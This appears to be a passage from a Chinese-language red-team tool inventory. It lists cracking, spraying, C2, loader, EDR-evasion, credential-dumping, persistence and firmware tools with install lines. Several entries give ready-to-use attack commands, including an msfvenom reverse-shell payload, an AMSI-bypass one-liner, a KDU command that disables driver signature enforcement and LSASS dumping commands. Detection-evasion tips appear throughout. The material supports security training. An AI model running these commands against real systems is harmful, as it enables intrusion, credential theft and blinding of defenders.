| **hashcat** | `OSS` | `sudo apt install hashcat` | GPU 加速的口令破解器。离线哈希破解最快。模式参考：`-m 0` MD5、`-m 1000` NTLM、`-m 22000` WPA2、`-m 13100` Kerberoast。需要 GPU。 |
| **John the Ripper** | `OSS` | `sudo apt install john` | 基于 CPU 的口令破解器。适合 hashcat 不支持的格式。在没有 GPU 的机器上也有用。 |
| **CeWL** | `OSS` | `sudo apt install cewl` | 从目标网站生成自定义字典。`cewl https://target.com -d 3 -m 5 -w wordlist.txt` —— 爬取 3 层深度，只取至少 5 个字符的词。 |
| **SecLists** | `OSS` | https://github.com/danielmiessler/SecLists (`sudo apt install seclists`) | 字典合集。口令、用户名、目录、子域名、载荷。装一次，长期受用。`/usr/share/seclists/` |
| **CredMaster** | `OSS` | https://github.com/knavesec/CredMaster | 通过 FireProx（AWS API Gateway）对 M365/Azure 进行凭据喷洒。自动轮换 IP 以规避锁定检测。**用它取代 MSOLSpray。** |
| **o365spray** | `OSS` | https://github.com/0xZDH/o365spray | Microsoft 365 用户枚举与口令喷洒，支持多种校验方式。 |
| **mitm6** | `OSS` | https://github.com/dirkjanm/mitm6 (`pip3 install mitm6`) | 针对 AD 环境的 IPv6 DHCP 欺骗攻击。多数企业网络启用了 IPv6 却无人监控。与 ntlmrelayx 配合可捕获凭据。`sudo mitm6 -d lab.local` |

> 💡 **新手提示（mitm6）：** 这是针对 AD 环境最被低估、也最可靠的攻击之一。发送伪造的 IPv6 DHCP 通告，把自己设为 DNS 服务器，捕获 NTLM 认证。即使环境已打补丁、做过加固也照样有效，因为 IPv6 常常被遗忘。内网项目中始终要试一次。

---

### 🧰 漏洞利用框架

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Metasploit Framework** | `OSS` | `sudo apt install metasploit-framework` | 使用最广泛的漏洞利用框架。2,000 多个利用模块、后渗透模块、载荷生成器。`msfconsole` 启动。它既是你的辅助轮，也是你的工具箱。 |
| **Impacket** | `OSS` | https://github.com/fortra/impacket (`pip3 install impacket`) | 用于网络协议的 Python 库。Windows/AD 领域最重要的攻防工具包。包含：secretsdump、GetNPUsers、GetUserSPNs、ntlmrelayx、psexec、smbexec、wmiexec。每个脚本都要学。 |

---

### 🔎 漏洞扫描

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **OpenVAS / Greenbone** | `OSS` | https://www.greenbone.net/en/community-edition/ | 完整的网络漏洞扫描器。CVE 覆盖全面。比 nuclei 慢但更深。对范围内目标跑一次，再用 nuclei 做定向扫描。 |

---

<a id="phase-3-binary"></a>
## 阶段 3：二进制与系统漏洞利用

---

### 💥 二进制漏洞利用

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **pwntools** | `OSS` | https://github.com/Gallopsled/pwntools (`pip3 install pwntools`) | 用于漏洞利用开发的 Python 框架。处理进程交互、GDB 集成、ELF 解析、shellcode 生成、ROP 链构建与远程连接。CTF 与真实漏洞利用开发的基础。 |
| **ROPgadget** | `OSS` | https://github.com/JonathanSalwan/ROPgadget (`pip3 install ROPgadget`) | 在二进制中查找 ROP（返回导向编程）gadget。`ROPgadget --binary ./vuln --rop` 列出所有可用链。`--rop --chain "execve"` 生成一条可用链。 |
| **Ropper** | `OSS` | https://github.com/sashs/Ropper (`pip3 install ropper`) | 另一款 ROP gadget 查找工具，输出选项更多、搜索更灵活。`ropper -f binary --search "pop rdi"` —— 常能找到 ROPgadget 漏掉的 gadget。 |
| **one_gadget** | `OSS` | https://github.com/david942j/one_gadget (`gem install one_gadget`) | 在 libc 中查找 “one-gadget” RCE gadget —— 直接调用 `execve("/bin/sh")` 的单个 ROP 地址。`one_gadget /lib/x86_64-linux-gnu/libc.so.6` |
| **how2heap** | `OSS` | https://github.com/shellphish/how2heap (`git clone`) | 可用的堆利用技术示例仓库：tcache dup、fastbin dup、重叠块、house of spirit、house of force、safe-linking 绕过，以及每个 glibc 版本的变体。你的首要堆参考资料。 |
| **patchelf** | `OSS` | `sudo apt install patchelf` | 修改 ELF 二进制头，以改用其他 libc 或解释器。CTF 中提供特定 libc 的题目必备。`patchelf --set-interpreter /path/to/ld ./binary` |
| **pwninit** | `OSS` | https://github.com/io12/pwninit | 自动化 CTF 二进制环境准备：下载匹配的 libc、设置解释器、用正确的 libc 启动 GDB。在题目目录里执行 `pwninit`。 |
| **checksec** | `OSS` | `pip3 install checksec.py` 或 `checksec --file=binary` | 显示二进制的安全缓解措施：NX、PIE、RELRO、栈 canary、ASLR。开始利用之前先跑它。它告诉你面对的是什么防护。 |

> 💡 **新手提示（glibc 堆）：** 在学 how2heap 之前，先理解分配器的数据结构。
> - **tcache：** 每个线程的空闲块缓存。每个尺寸类 7 个 bin，速度快，旧版 glibc（2.32 之前）没有完整性检查。
> - **fastbins：** 小块（≤0x80 字节）。LIFO。不与相邻块合并。
> - **smallbins：** 中等块（0x20–0x3f0）。双向链表。unlink 攻击的目标就是它们。
> - **unsorted bin：** 释放的块先落到这里，再被归类进 small/large bins。
>
> 常见攻击路径：破坏某个块的 `fd` 指针 → tcache/fastbin dup → 分配到任意地址 → 写入 shellcode 或覆盖 `__free_hook`/`__malloc_hook`。现代 glibc（2.34+）移除了 `__free_hook` —— 当前技术见 how2heap。

---

### 🔬 Shellcode 汇编

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **keystone-engine** | `OSS` | https://www.keystone-engine.org (`pip3 install keystone-engine`) | 多架构汇编框架。在 Python 脚本中把汇编文本转换成机器码字节。`ks.asm("mov rax, 0x3b; syscall")` |
| **capstone** | `OSS` | https://www.capstone-engine.org (`pip3 install capstone`) | 多架构反汇编框架。在 Python 中把机器码字节转换成汇编。与 keystone 互补。 |
| **pwntools shellcraft** | `OSS` | 随 pwntools 附带 | 内置的 shellcode 生成器。`python3 -c "from pwn import *; print(shellcraft.amd64.sh())"` —— 生成 execve("/bin/sh") shellcode。 |

---

### 🎰 模糊测试

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **AFL++** | `OSS` | https://github.com/AFLplusplus/AFLplusplus (`git clone && make distrib && sudo make install`) | 最先进的覆盖率引导模糊测试器。对二进制插桩，喂入变异输入，跟踪新增的代码覆盖。找出会导致 bug 的崩溃。原生代码模糊测试的行业标准。 |
| **libFuzzer** | `OSS` | https://llvm.org/docs/LibFuzzer.html （包含在 LLVM/clang 中） | LLVM 的进程内模糊测试器。用 `-fsanitize=fuzzer,address` 编译目标。因为目标在同一进程内运行，所以很快。最适合库。 |
| **Honggfuzz** | `OSS` | https://github.com/google/honggfuzz (`git clone && make`) | Google 的覆盖率引导模糊测试器。由于覆盖率度量不同，常能找到 AFL++ 漏掉的 bug。持久模式极快。适合作为 AFL++ 之后的第二款模糊测试器。 |
| **boofuzz** | `OSS` | https://github.com/jtpereyda/boofuzz (`pip3 install boofuzz`) | 网络协议模糊测试器。Sulley 的继任者。定义消息结构、对字段做模糊测试、监控崩溃。用于私有协议、ICS 系统与网络守护进程。 |
| **WinAFL** | `OSS` | https://github.com/googleprojectzero/winafl | AFL 的 Windows 移植版。使用 Intel PT 或 DynamoRIO 获取覆盖率。对无法重新编译的 Windows 二进制做模糊测试。阶段 3–4D。 |
| **Fuzzilli** | `OSS` | https://github.com/googleprojectzero/fuzzilli | Google Project Zero 的 JavaScript 引擎模糊测试器。生成语义合法的 JS 程序，探索 V8/SpiderMonkey JIT 编译器的边界情况。阶段 4D（浏览器研究）。 |

> 💡 **新手提示（AFL++）：** 最小可用的 AFL++ 工作流：
> ```bash
> # 1. 用 AFL++ 插桩编译
> CC=afl-clang-fast ./configure && make
>
> # 2. 创建输入语料
> mkdir in && echo "test" > in/seed
>
> # 3. 运行模糊测试器
> afl-fuzz -i in -o out -- ./target_binary @@
>
> # 4. 对崩溃做分类处理
> ls out/default/crashes/
> ```
> `out/default/crashes/` 里的崩溃就是你的 bug。用 `afl-tmin` 最小化，再用 GDB+GEF 分析。

---

### 🧠 符号执行与污点分析

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **angr** | `OSS` | https://angr.io (`pip3 install angr`) | 带符号执行的二进制分析框架。自动探索所有程序路径。用于：CTF 题目、自动化漏洞利用生成、寻找可达的易受攻击代码路径。学习曲线陡峭。到阶段 4D 值得投入。 |
| **Triton** | `OSS` | https://triton-library.github.io (`git clone + cmake build`) | Intel 的动态二进制分析框架，具备污点跟踪与符号执行。在特定污点分析任务上比 angr 更精确。阶段 4D 研究级。 |

---

<a id="phase-4ab-implant"></a>
## 阶段 4A/B：植入体、C2 与加载器开发

---

### 🧭 C2 框架选型决策树

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Tools_Inventory/2._C2_Framework_Selection_Decision_Tree.png" alt="C2 框架选型决策树" width="750"/>

</td></tr></table>
</div>

---

### 🎯 C2 框架（开源）

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Sliver** (BishopFox) | `OSS` | https://github.com/BishopFox/sliver | 基于 Go 的 C2 框架。mTLS、WireGuard、HTTP/S、DNS 传输。支持 BOF 执行、SOCKS5、端口转发、进程注入与 armory（扩展）。2027 年默认的开源 C2。 |
| **Havoc** | `OSS` | https://github.com/HavocFramework/Havoc | 带 Demon agent 的 C/C++ C2。专注 EDR 规避。内置睡眠混淆、自定义后渗透模块、Malleable C2 配置。当 Sliver 噪声太大时，它是 2027 年的替代方案。 |
| **Metasploit Framework** | `OSS` | https://metasploit.com | 经典之作。凭借其利用模块覆盖与载荷生成能力，至今仍不可或缺。Meterpreter 不如自定义加载器隐蔽，但仍是拿到可用 shell 最快的方式。 |

> 💡 **新手提示（C2 架构）：** C2 框架有三个组件：(1) 攻击机上的 **server** 接收信标；(2) **redirector**（反向代理）位于 server 之前，转发信标流量并阻断直接访问；(3) **implant/agent** 在目标上运行并定期回连。绝不要直接暴露 C2 服务器；始终使用重定向器（Apache/Nginx/Cloudflare Workers）。

---

### 🔒 C2 框架（商业版：仅需了解）

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **Cobalt Strike 5.x** | `COMMERCIAL`（约 $5,000+/年，需以组织名义购买） | https://www.cobaltstrike.com | 行业标准的红队 C2。Beacon agent、Malleable C2 配置、BOF 支持、团队服务器。即使你不用它，也必须理解它 —— 蓝队正是针对它构建检测的。 |
| **BruteRatel C4** | `COMMERCIAL`（约 $2,500/年） | https://bruteratel.com | 被 Lazarus Group、BlackCat 等威胁行为体在真实攻击中使用。理解其能力对威胁情报与规避防御的认知至关重要。购买需要资质审核。 |
| **NightHawk** | `COMMERCIAL` | https://www.mdsec.co.uk/nighthawk/ | MDSec 的极强规避 C2。常见于威胁报告。属认知级知识 —— 理解它凭什么规避检测。 |

---

### 🔧 Shellcode、加载器与注入

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **sRDI** (Shellcode Reflective DLL Injection) | `OSS` | https://github.com/monoxgas/sRDI | 把 DLL 转换为位置无关的 shellcode。省去对 `LoadLibrary` 的依赖。完全在内存中加载并执行 DLL。提供 Python 的 `ConvertToShellcode` 函数。 |
| **donut** | `OSS` | https://github.com/TheWover/donut (`git clone && make`) | 把 .NET 程序集、EXE 与 DLL 转换为位置无关的 shellcode。无需落盘即可从内存运行 .NET 工具。`donut -f 1 tool.exe -o shellcode.bin` |
| **Freeze.rs** | `OSS` | https://github.com/optiv/Freeze.rs (`cargo build --release`) | 基于 Rust 的载荷生成器与 shellcode 加密器。生成高度混淆的加载器。内置 AES 加密、AMSI 补丁与 ETW 补丁。 |
| **msfvenom** | `OSS` | 随 Metasploit 附带 | 快速载荷生成器。适合测试。不适合真实行动（检测率极高）。`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe` |
| **nanodump** | `OSS` | https://github.com/helpsystems/nanodump | 可绕过多数 EDR 检测的 LSASS 内存转储。使用多种转储方式（fork、dup-handle、UnmapViewOfFile）。不调用 `MiniDumpWriteDump` 即可产出合法的 minidump。 |

---

### 📦 BOF 开发与执行

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **CS-Situational-Awareness-BOF** (TrustedSec) | `OSS` | https://github.com/trustedsec/CS-Situational-Awareness-BOF | 用于后渗透的 Beacon Object File（BOF）合集：whoami、netstat、ipconfig、netview、schtasksenum 等 40 多个。无需派生新进程即可运行。 |
| **COFFLoader** | `OSS` | https://github.com/trustedsec/COFFLoader | 无需 Cobalt Strike 即可执行 BOF。可从任意 C2 框架或独立环境中测试并运行 BOF。 |
| **BOF.NET** | `OSS` | https://github.com/CCob/BOF.NET | 以 BOF 形式运行 .NET 代码。在 Beacon 上下文中打通托管与非托管执行。 |

---

### 😴 睡眠混淆

> EDR 会在信标空闲（睡眠）时扫描内存中的信标特征。睡眠混淆在睡眠期间对内存中的信标加密，从而挫败这种检测。这些技术都必须理解。

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **Ekko** | `OSS` | https://github.com/Cracked5pider/Ekko | 基于 APC 的睡眠混淆。用 `NtQueueApcThread` 把加密 → 睡眠 → 解密调度为 APC 回调。参考实现。 |
| **Foliage** | `OSS` | https://github.com/SecIdiot/FOLIAGE | 基于线程池的睡眠混淆。使用 Windows 线程池 API，实现更简洁。 |
| **Cronos** | `OSS` | https://github.com/Idov31/Cronos | 基于定时器队列执行的加密睡眠。结合加密与调用栈伪造。 |
| **SilentMoonwalk** | `OSS` | https://github.com/klezVirus/SilentMoonwalk | 睡眠混淆与完整调用栈伪造的组合。最完整的开源实现。可作为自定义实现的参考。 |

---

### 📚 调用栈伪造

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **SilentMoonwalk** | `OSS` | https://github.com/klezVirus/SilentMoonwalk | 在睡眠期间伪造调用栈，使内存扫描器看到的是干净调用栈，而不是信标调用链。 |
| **Unwinder** | `OSS` | https://github.com/Kudaes/Unwinder | 基于 Rust 的调用栈展开规避。实现思路与 SilentMoonwalk 不同。 |

---

### ⚙️ 系统调用绕过

> EDR 通过挂钩 `ntdll.dll` 的用户态函数来拦截 API 调用。直接系统调用绕过这些钩子，直达内核。先理解概念，再看工具。

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **SysWhispers3** | `OSS` | https://github.com/klezVirus/SysWhispers3 | 为任意 Windows API 生成直接与间接系统调用桩。`python3 SysWhispers.py --preset all -o syscalls` 输出可直接使用的 C 头文件。 |
| **TartarusGate** | `OSS` | https://github.com/trickster0/TartarusGate | 动态间接系统调用解析器。即使 EDR 已打过补丁，也能在运行时找到干净的系统调用桩。比静态系统调用号更具韧性。 |
| **RecycledGate** | `OSS` | https://github.com/thefLink/RecycledGate | Hell's Gate 的变体。通过复用已挂钩函数中现有的系统调用指令来解析系统调用号。你的 shellcode 里不含系统调用指令。 |
| **HellsGate** | `OSS` | https://github.com/am0nsec/HellsGate | 最早的直接系统调用技术。运行时从内存中的 ntdll.dll 读取系统调用号。这是基础技术：先理解它，再看其他变体。 |

---

### 🦀 攻防 Rust

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **RustRedOps** | `OSS` | https://github.com/joaoviictorti/RustRedOps | 用 Rust 实现的攻防安全工具合集：进程注入、shellcode 加载器、NTAPI 调用、令牌操作。 |

---

### 🔍 恶意软件分析（了解你的防守方）

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **CAPE Sandbox** | `OSS` | https://github.com/kevoreilly/CAPEv2 | 恶意软件分析沙箱。Cuckoo 的继任者。行为分析、进程注入检测、YARA 扫描。可自建以做私有分析。 |
| **Tria.ge** | `FREEMIUM` | https://tria.ge | 云端恶意软件沙箱。出结果快。免费档限制提交次数。把你的载荷提交上去，了解防守方会看到什么。 |
| **ANY.RUN** | `FREEMIUM` | https://any.run | 交互式云沙箱。在浏览器里实时观看恶意软件执行。支持公开免费提交。理解 TTP 的宝贵资源。 |
| **Hybrid Analysis** | `FREE` | https://hybrid-analysis.com | 来自 CrowdStrike Falcon Sandbox 的自动化恶意软件分析。有免费档，适合快速分析。 |
| **YARA** | `OSS` | `sudo apt install yara` | 用于恶意软件识别的模式匹配规则语言。在上线前编写规则检测你自己的载荷。清楚你会触发什么。 |
| **Detect-It-Easy (DIE)** | `OSS` | https://github.com/horsicq/Detect-It-Easy | 加壳器与编译器识别工具。丢一个 PE 进去，DIE 会告诉你它被什么加壳、被什么编译，以及检测到哪些混淆。 |

---

<a id="phase-4c-edr"></a>
## 阶段 4C：EDR / AV 规避

---

### 🛡️ EDR 绕过

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **EDRSandBlast** | `OSS` | https://github.com/wavestone-cdt/EDRSandblast | 移除 EDR 的内核回调与用户态钩子。利用有漏洞的驱动直接篡改内核结构。使多数 EDR 产品失明。理解它，才能理解你在防什么。 |
| **Gargoyle** | `OSS` | https://github.com/JLospinoso/gargoyle | 基于 ROP 的载荷执行方式，使 shellcode 在休眠时不可执行（不是 `PAGE_EXECUTE`）。可挫败那些寻找“无可信调用栈的可执行区域”的内存扫描器。 |
| **Dinvoke (.NET)** | `OSS` | https://github.com/TheWover/DInvoke | 面向 .NET 的 D/Invoke。通过动态解析 API 地址并使用委托调用来避开 P/Invoke 钩子。这是在 .NET 中调用 Windows API 的 EDR 安全方式。 |

---

### 🔬 ETW 与 AMSI 绕过

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **ETW patching**（手工技术） | `OSS` | 在 GitHub 搜索："EtwEventWrite patch PoC" | 修补 `ntdll.dll` 中的 `EtwEventWrite`，使其立即返回而不记录日志。致盲基于 ETW 的监控。手工掌握这个单字节补丁技术。 |
| **AMSI patching**（手工技术） | `OSS` | 在 GitHub 搜索："AmsiScanBuffer bypass" | 修补 `amsi.dll` 中的 `AmsiScanBuffer`，使其始终返回 `AMSI_RESULT_CLEAN`。绕过 PowerShell/VBA/WMIC 的 AMSI 扫描。多种手法：修补函数、破坏上下文、在内存中修补该 DLL。 |

> 💡 **新手提示（AMSI 绕过）：** 这条经典单行命令在未打补丁的系统上仍然有效：
> ```powershell
> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
> ```
> 在背下语法之前，先理解它为什么有效（把 `amsiInitFailed` 置为 `true`，使 AMSI 永不初始化）。

---

### 🔍 检测意识（了解什么会抓到你）

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **PE-sieve** | `OSS` | https://github.com/hasherezade/pe-sieve | 扫描进程中的注入代码、钩子、补丁与被修改的内存。对你自己载荷运行，看什么会被检测到。 |
| **Moneta** | `OSS` | https://github.com/forrest-orr/moneta | 内存扫描器，检测进程中的异常内存区域。模拟防御方扫描器所看到的内容。上线前用它测试你的加载器。 |
| **BeaconEye** (detection reference) | `OSS` | https://github.com/CCob/BeaconEye | Cobalt Strike 信标检测器。理解它找的是哪些特征 —— 然后确保你的自定义信标不具备这些特征。 |
| **Objective-See suite** (macOS defenders) | `FREE` | https://objective-see.org | macOS 安全工具：BlockBlock、KnockKnock、ProcessMonitor。了解 Mac 上的防守方看到什么。 |

---

<a id="phase-4d-vr"></a>
## 阶段 4D：漏洞研究与 0-Day

---

### 🧭 逆向工程与反汇编器选型

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Tools_Inventory/4._Reverse_Engineering_&_Disassembler_Selection.png" alt="逆向工程与反汇编器选型" width="1400"/>

</td></tr></table>
</div>

---

### 🔭 静态分析与逆向工程

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Ghidra** (NSA) | `OSS` | https://ghidra-sre.org | 完整的反编译与逆向工程套件。免费。多数任务上可与 IDA Pro 相比。可用 Java 或 Python 写脚本。除非你有 IDA 预算，否则它就是你的主力逆向工具。 |
| **IDA Pro** | `COMMERCIAL`（完整授权约 $3,000+） | https://hex-rays.com/ida-pro/ | 行业标准的逆向工具。在某些架构上优于 Ghidra。免费版（IDA Freeware）支持 x86/x64/ARM/ARM64，但不含反编译器。 |
| **Binary Ninja** | `COMMERCIAL`（约 $400/年，提供试用） | https://binary.ninja | 现代逆向平台，拥有出色的自动化 API。介于 Ghidra（免费/较慢）与 IDA Pro（昂贵）之间的折中。个人授权约 $400/年。提供试用。 |
| **Radare2 (r2)** | `OSS` | `sudo apt install radare2` | 命令行逆向框架。学习曲线陡峭。一旦掌握则极其强大。`r2 -A binary` 后接 `pdf` 反汇编。 |
| **Cutter** | `OSS` | https://cutter.re | Radare2 的图形界面。让 r2 对初学者更易上手。用它做可视化分析，写脚本时切回 r2 命令行。 |
| **x64dbg** | `OSS` | https://x64dbg.com | Windows 图形界面调试器。开源。取代 OllyDbg。各种插件应有尽有。从业者标准的 Windows 用户态调试器。 |
| **WinDbg Preview** | `FREE` | Microsoft Store | 微软的内核与用户态调试器。Windows 内核研究、崩溃转储分析与驱动调试必备。`!analyze -v` 是你的好朋友。 |

---

### 🔀 补丁差分

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **BinDiff** (Google/Zynamics) | `FREE` | https://www.zynamics.com/bindiff.html | 行业标准的二进制差分工具。对比已打补丁与未打补丁的二进制，定位漏洞位置。从 IDA 或 Ghidra 导出，再用 BinDiff 界面比对。 |
| **Diaphora** | `OSS` | https://github.com/joxeankoret/diaphora （`git clone`，作为 Ghidra/IDA 插件使用） | BinDiff 的免费开源替代方案。同时支持 Ghidra 与 IDA Pro。最好的免费补丁差分选择。 |
| **patchdiff2** | `OSS` | https://github.com/filcab/patchdiff2 | 用于补丁差分的 IDA Pro 插件。较老但可用。 |

---

### ⚙️ 动态分析与内核研究

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **QEMU/KVM** | `OSS` | `sudo apt install qemu-kvm qemu-utils` | 完整系统模拟。用 `buildroot` 创建极简内核研究环境。把 GDB 挂到 QEMU 客户机内核上做内核漏洞利用研究。 |
| **VirtualKD-Redux** | `OSS` | https://github.com/4d61726b/VirtualKD-Redux | 透明的 VMware/VirtualBox 内核调试辅助工具。让 WinDbg 内核调试变快（无需串口线）。Windows 内核研究必备。 |
| **rr** (Mozilla) | `OSS` | https://rr-project.org (`sudo apt install rr`) | 记录与重放调试器。记录一次 bug，确定性地重放。不再有“它只是偶尔崩”。对模糊测试中的间歇性崩溃极有价值。 |
| **AddressSanitizer (ASAN)** | `OSS` | 内置于 GCC/Clang | 编译期内存错误检测器。`-fsanitize=address` 标志。在运行时捕获堆/栈溢出、释放后使用、双重释放，并给出精确位置。 |
| **UBSan** | `OSS` | 内置于 GCC/Clang | 未定义行为检测器。`-fsanitize=undefined`。捕获整数溢出、空指针解引用、非对齐访问。与 ASAN 一起运行。 |

---

### 🌐 Wasm 与浏览器研究

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **wabt** (WebAssembly Binary Toolkit) | `OSS` | https://github.com/WebAssembly/wabt (`sudo apt install wabt`) | WebAssembly 逆向的必备工具包。`wasm-decompile` 把 .wasm 反编译成可读的类 C 代码。`wasm-objdump -d` 显示汇编。`wasm2wat` 转换为文本格式。 |
| **Fuzzilli** | `OSS` | https://github.com/googleprojectzero/fuzzilli | V8/SpiderMonkey JavaScript 引擎模糊测试器。生成语义合法的 JS 程序，针对 JIT 编译器的边界情况。需要从源码构建。阶段 5 级工具。 |
| **d8** (V8 debug shell) | `OSS` | 自行构建：https://v8.dev/docs/build | V8 JavaScript 引擎的调试构建。浏览器漏洞利用研究必备。用 `--debug` 构建以获得 ASAN + 详细输出。 |

---

<a id="phase-4e-apt"></a>
## 阶段 4E：APT 持久化、rootkit 与反取证

---

### 🔑 BYOVD 与内核驱动攻击

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **KDU** (Kernel Driver Utility) | `OSS` | https://github.com/hfiref0x/KDU | **BYOVD 工具的代表。** 利用已知存在漏洞的已签名驱动绕过驱动签名强制（DSE），加载未签名的 rootkit 驱动。支持 30 多种有漏洞的驱动。`kdu.exe -prv 0 -dse 0` 关闭 DSE。 |
| **LOLDrivers Database** | `FREE`（网页） | https://www.loldrivers.io | 已知存在漏洞的合法签名驱动数据库。可按 CVE、类别或能力搜索。配合 KDU 使用，或用于手工 BYOVD 攻击。 |
| **PPLKiller** | `OSS` | https://github.com/itm4n/PPLdump | 绕过受保护进程轻量（PPL）机制，以访问 LSASS 等受保护进程。需要管理员权限，绕过 LSASS 保护以转储凭据。 |

---

### 🖥️ Windows 内核调试

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **WinDbg Preview** | `FREE` | Microsoft Store | Windows 内核调试器。内核态分析：`!process 0 0`、`dt nt!_EPROCESS`、`!drvobj`。驱动与内核漏洞利用开发必备。 |
| **VirtualKD-Redux** | `OSS` | https://github.com/4d61726b/VirtualKD-Redux | 加速 VMware/VirtualBox 内核调试。替代缓慢的串口/管道传输。快到足以做交互式调试。 |
| **WinObj** | `FREE` | https://learn.microsoft.com/en-us/sysinternals/downloads/winobj | Sysinternals 工具，展示 Windows 对象命名空间。可查看内核对象、设备对象与驱动对象。rootkit 研究时有用。 |
| **Process Hacker 3 / System Informer** | `OSS` | https://processhacker.sourceforge.io | 深度进程分析。查看句柄、内存区域、线程与内核驱动。在 rootkit 检测与研究上优于任务管理器。 |

---

### 🔒 UEFI 与固件

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **efiXplorer** (Binarly) | `OSS` | https://github.com/binarly-io/efiXplorer | Ghidra 与 IDA Pro 的 UEFI 固件分析插件。自动识别 EFI GUID、协议与服务调用。让 UEFI 逆向大幅提速。 |
| **CHIPSEC** | `OSS` | https://github.com/chipsec/chipsec | 平台安全评估框架。测试 SPI 闪存保护、UEFI 变量、SMRAM 保护与固件完整性。`python3 chipsec_main.py` 运行全部检查。 |
| **UEFITool** | `OSS` | https://github.com/LongSoft/UEFITool | 解析、浏览、提取并修改 UEFI 固件镜像。打开固件转储即可导航其结构：卷、文件、节区。 |
| **edk2** (TianoCore) | `OSS` | https://github.com/tianocore/edk2 | 开源 UEFI 实现。编写并编译 UEFI DXE 驱动。构建你自己的 UEFI 应用，学习固件开发模型。 |
| **EfiGuard** | `OSS` | https://github.com/Mattiwatti/EfiGuard | UEFI bootkit，在 Windows 启动过程中修补 `PatchGuard` 与 DSE。现代 UEFI bootkit 的研究/参考实现。 |
| **flashrom** | `OSS` | `sudo apt install flashrom` | 读取、写入并校验 SPI 闪存固件芯片。支持 USB 硬件编程器（CH341A、Dediprog）。用于从物理设备提取固件，并把修改后的固件写回。 |

---

### 💾 凭据转储（EDR 感知）

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **nanodump** | `OSS` | https://github.com/helpsystems/nanodump | 可绕过 EDR 的现代 LSASS 转储。多种转储技术，包括 fork+dump（从不直接打开 LSASS）、dup handle 与 snapshot。输出合法 minidump，可用 mimikatz/pypykatz 离线分析。 |
| **lsassy** | `OSS` | https://github.com/Hackndo/lsassy (`pip3 install lsassy`) | 远程 LSASS 转储，支持多种方式（nanodump、comsvcs、direct）。`lsassy -d domain -u user -p pass target_ip` —— 自动转储并解析凭据。 |
| **pypykatz** | `OSS` | https://github.com/skelsec/pypykatz (`pip3 install pypykatz`) | 用 Python 重写的 Mimikatz。离线解析 LSASS minidump 文件。`pypykatz lsa minidump lsass.dmp` —— 在你的 Linux 机器上从转储文件提取凭据。 |
| **Mimikatz** | `OSS` | https://github.com/gentilkiwi/mimikatz | 最早的凭据转储工具。检测率极高（每个 EDR/AV 都能抓到）。仍可用于：离线转储解析、理解技术原理、实验环境、为测试防御生成载荷。绝不要直接对已部署防御的目标使用。 |
| **LaZagne** | `OSS` | https://github.com/AlessandroZ/LaZagne | 从应用存储中恢复凭据：浏览器、邮件客户端、数据库、git、Wi-Fi 口令。它不碰 LSASS：面向应用层。`laZagne.exe all` |

---

### 🔄 持久化

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **SharPersist** | `OSS` | https://github.com/mandiant/SharPersist | 用 C# 编写的 Windows 持久化工具包。自动化：计划任务、注册表 Run 键、WMI 订阅、启动文件夹、COM 劫持。`SharPersist -t schtask -c "cmd.exe" -a "/c ..."` |
| **chainbreaker** | `OSS` | https://github.com/n0fate/chainbreaker | macOS 钥匙串解析器。从钥匙串数据库文件中提取凭据（离线，或配合 macOS 内存转储）。 |
| **MACOS-RedTeaming** (Mariana-Trench) | `OSS` | https://github.com/tonghuaroot/Mariana-Trench | macOS 红队工具包。TCC 绕过技术、LaunchAgent 持久化、dylib 劫持。 |

---

<a id="phase-4f-cloud"></a>
## 阶段 4F：云、AiTM 与高级 Web

---

### ☁️ AWS

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Pacu** (RhinoSecurity) | `OSS` | https://github.com/RhinoSecurityLabs/pacu (`pip3 install pacu`) | AWS 漏洞利用框架。模块涵盖：IAM 枚举、提权、数据外传、Lambda 利用、EC2 持久化。`run iam__enum_permissions` |
| **aws-cli** | `OSS` | https://aws.amazon.com/cli/ (`pip3 install awscli`) | 官方 AWS 命令行工具。低层、直接的 API 交互。`aws iam list-users`、`aws s3 ls`、`aws sts get-caller-identity`。你做 AWS 工作的基础工具。 |
